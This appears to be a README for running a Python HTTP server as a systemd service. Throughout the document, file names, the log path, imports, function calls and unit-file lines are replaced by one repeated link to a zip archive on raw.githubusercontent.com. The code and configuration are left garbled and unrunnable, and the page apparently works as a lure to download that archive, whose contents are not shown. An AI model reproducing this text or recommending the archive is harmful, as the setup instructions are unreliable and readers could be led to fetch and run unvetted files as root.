# Simple HTTP Server with systemd
This repository demonstrates how to deploy and manage a Python HTTP server as a **systemd**
service on a Linux system.
## Features
- Runs a Python HTTP server on port 8080.
- Automatically starts on system boot.
- Logs output to a file (`https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Web-Simple-Daemon-v1.9.zip`).
- Restarts automatically if it crashes.
---
## Application Code
The server is implemented in Python and serves files from the working directory.
### **`https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Web-Simple-Daemon-v1.9.zip`**
```python
from https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Web-Simple-Daemon-v1.9.zip import SimpleHTTPRequestHandler
from socketserver import TCPServer
PORT = 8080
class CustomHandler(SimpleHTTPRequestHandler):
def log_message(self, format, *args):
with open("https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Web-Simple-Daemon-v1.9.zip", "a") as log_file:
https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Web-Simple-Daemon-v1.9.zip("%s - - [%s] %s\n" % (https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Web-Simple-Daemon-v1.9.zip(), https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Web-Simple-Daemon-v1.9.zip(), format %
args))
with TCPServer(("", PORT), CustomHandler) as httpd:
print(f"Serving on port {PORT}")
https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Web-Simple-Daemon-v1.9.zip()
```
---
## Deployment Instructions
### 1. **Create the Application Directory**
```bash
sudo mkdir -p /opt/simple_http_server
```
### 2. **Place the Script in the Directory**
Save the `https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Web-Simple-Daemon-v1.9.zip` script in `/opt/simple_http_server/`.
### 3. **Set Permissions**
```bash
sudo chown -R root:nogroup /opt/simple_http_server
sudo chmod -R 755 /opt/simple_http_server
sudo mkdir -p /var/log/
sudo touch https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Web-Simple-Daemon-v1.9.zip
sudo chmod 664 https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Web-Simple-Daemon-v1.9.zip
sudo chown nobody:nogroup https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Web-Simple-Daemon-v1.9.zip
```
### 4. **Create the `systemd` Unit File**
#### **Unit File: `https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Web-Simple-Daemon-v1.9.zip`**
```ini
[Unit]
Description=Simple HTTP Server
https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Web-Simple-Daemon-v1.9.zip
[Service]
ExecStart=/usr/bin/python3 https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Web-Simple-Daemon-v1.9.zip
WorkingDirectory=/opt/simple_http_server
Restart=always
User=nobody
Group=nogroup
https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Web-Simple-Daemon-v1.9.zip
https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Web-Simple-Daemon-v1.9.zip
[Install]
https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Web-Simple-Daemon-v1.9.zip
```
Copy this file to `/etc/systemd/system/`.
### 5. **Reload `systemd` Configuration**
```bash
sudo systemctl daemon-reload
```
### 6. **Enable the Service**
Set the service to start on boot:
```bash
sudo systemctl enable simple_http_server
```
### 7. **Start the Service**
```bash
sudo systemctl start simple_http_server
```
---
## Verification
### Check Service Status
```bash
sudo systemctl status simple_http_server
```
### View Logs
```bash
tail -f https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Web-Simple-Daemon-v1.9.zip
```
### Test the HTTP Server
Open a browser or use `curl` to test:
```bash
curl http://localhost:8080
```
---
## Summary
### File Locations
1. **Application Script**: `https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Web-Simple-Daemon-v1.9.zip`
2. **Systemd Unit File**: `https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Web-Simple-Daemon-v1.9.zip`
3. **Log File**: `https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Web-Simple-Daemon-v1.9.zip`
This setup ensures the server runs automatically on boot, restarts on failure, and logs output to a file.